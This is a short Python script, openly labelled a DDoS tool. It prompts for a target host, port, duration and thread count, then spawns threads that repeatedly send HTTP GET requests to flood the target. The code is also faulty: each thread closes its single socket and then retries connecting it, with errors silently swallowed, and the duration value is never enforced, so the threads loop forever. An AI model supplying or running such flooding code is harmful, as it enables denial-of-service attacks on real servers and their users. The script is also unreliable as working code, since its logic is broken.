import socket
import threading
import time

def ddos(target, port, duration):
    # Create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Prepare the HTTP request
    headers = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"

    # Send the request in a loop
    while True:
        try:
            client.connect((target, port))
            client.send(headers.encode())
            client.close()
        except:
            pass

        time.sleep(0.001)  # Adjust the sleep time to control the rate of requests

def main():
    target = input("Enter the target URL (e.g., example.com): ")
    port = int(input("Enter the port (e.g., 80 or 443): "))
    duration = int(input("Enter the duration in seconds: "))
    threads = int(input("Enter the number of threads: "))

    print(f"Starting DDoS attack on {target} for {duration} seconds using {threads} threads.")

    start_time = time.time()

    # Create and start threads
    for _ in range(threads):
        threading.Thread(target=ddos, args=(target, port, duration)).start()

    # Wait for the specified duration
    while time.time() - start_time < duration:
        time.sleep(1)

    print("DDoS attack completed.")

if __name__ == "__main__":
    main()